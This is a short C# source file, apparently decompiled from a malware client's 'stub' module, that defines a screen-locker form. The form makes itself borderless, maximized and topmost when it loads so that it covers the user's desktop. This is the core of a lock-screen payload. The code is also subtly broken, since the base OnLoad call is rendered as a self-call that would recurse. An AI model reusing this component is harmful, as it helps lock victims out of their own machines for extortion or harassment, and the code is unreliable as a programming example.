using System;
using System.Windows.Forms;

namespace VanillaStub;

public class IScreenLocker : Form
{
	protected override void OnLoad(EventArgs e)
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_TopMost(true);
		((Form)this).OnLoad(e);
	}
}
